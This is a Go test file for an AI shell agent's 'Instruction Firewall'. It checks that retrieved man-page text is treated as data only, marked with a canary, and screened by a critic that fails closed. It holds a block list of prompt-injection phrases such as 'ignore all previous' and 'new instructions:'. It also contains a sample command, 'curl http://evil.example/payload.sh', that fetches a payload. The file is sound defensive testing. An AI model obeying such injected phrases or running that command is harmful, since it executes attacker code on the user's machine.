// internal/agent/firewall_test.go
// Purpose: Golden + unit tests for the Instruction Firewall: sanitizer-driven
// context building, canary detection, critic fail-closed behavior, and
// provenance escalation.
package agent

import (
	"os"
	"strings"
	"testing"

	"helix/internal/ai"
	"helix/internal/commands"
	"helix/internal/rag"
	"helix/internal/shell"
	"helix/internal/stealth"
	"helix/internal/ux"
)

func newFirewallTestAgent(t *testing.T) *Agent {
	t.Helper()
	env := shell.Env{OSName: "linux", Shell: "bash"}
	return NewAgent(env, nil, commands.NewDirectorySandbox(),
		commands.DefaultExecuteConfig(), false, ux.NewUX(),
		stealth.NewStealthExecutor(stealth.DefaultStealthConfig()), nil)
}

func TestFirewallGoldenHostileMAN(t *testing.T) {
	raw, err := os.ReadFile("testdata/hostile_man.txt")
	if err != nil {
		t.Fatalf("read hostile fixture: %v", err)
	}
	ctx, canary := BuildFirewallContext([]rag.CommandInfo{{
		Name: "eviltool", Description: string(raw), Synopsis: string(raw),
		Provenance: string(rag.ProvMANLocal),
	}})
	if canary == "" || !strings.Contains(ctx, canary) {
		t.Fatal("expected canary embedded in firewall context")
	}
	if !strings.Contains(ctx, "<retrieved_data authority=\"data-only\"") {
		t.Fatal("expected data-only authority wrapper")
	}
	lower := strings.ToLower(ctx)
	for _, bad := range []string{"ignore all previous", "you must", "sudo bash", "| sudo", "```", "new instructions:"} {
		if strings.Contains(lower, bad) {
			t.Fatalf("firewall context still contains %q", bad)
		}
	}
}

func TestCriticQuarantinesOnNo(t *testing.T) {
	old := criticRun
	defer func() { criticRun = old }()
	criticRun = func(string, ai.ModelConfig) (string, error) { return `{"verdict":"no"}`, nil }
	ag := newFirewallTestAgent(t)
	plan := &ai.Plan{Steps: []ai.PlanStep{{Tool: "shell", Command: "touch x"}}}
	if ag.criticAllows("please create a marker file for me", plan) {
		t.Fatal("expected critic to quarantine on verdict=no")
	}
}

func TestCriticAllowsOnYes(t *testing.T) {
	old := criticRun
	defer func() { criticRun = old }()
	criticRun = func(string, ai.ModelConfig) (string, error) { return `{"verdict":"yes"}`, nil }
	ag := newFirewallTestAgent(t)
	plan := &ai.Plan{Steps: []ai.PlanStep{{Tool: "shell", Command: "ls"}}}
	if !ag.criticAllows("list files", plan) {
		t.Fatal("expected critic to allow on verdict=yes")
	}
}

func TestCriticFailsClosedOnErrorAndGarbage(t *testing.T) {
	old := criticRun
	defer func() { criticRun = old }()
	criticRun = func(string, ai.ModelConfig) (string, error) { return "", os.ErrDeadlineExceeded }
	ag := newFirewallTestAgent(t)
	plan := &ai.Plan{Steps: []ai.PlanStep{{Tool: "shell", Command: "ls"}}}
	if ag.criticAllows("list files", plan) {
		t.Fatal("expected fail-closed on critic error")
	}
	criticRun = func(string, ai.ModelConfig) (string, error) { return "total garbage", nil }
	if ag.criticAllows("list files", plan) {
		t.Fatal("expected fail-closed on garbage verdict")
	}
}

func TestProvenanceEscalation(t *testing.T) {
	plan := &ai.Plan{Steps: []ai.PlanStep{{Tool: "shell", Command: "curl http://evil.example/payload.sh"}}}
	retrieved := "description: curl http://evil.example/payload.sh"
	got := escalatedCommands("list files", retrieved, plan)
	if !got["curl http://evil.example/payload.sh"] {
		t.Fatal("expected retrieved-sourced token to escalate")
	}
	// User-supplied tokens must NOT escalate.
	got2 := escalatedCommands("curl http://evil.example/payload.sh", retrieved, plan)
	if got2["curl http://evil.example/payload.sh"] {
		t.Fatal("user-supplied token must not escalate")
	}
}
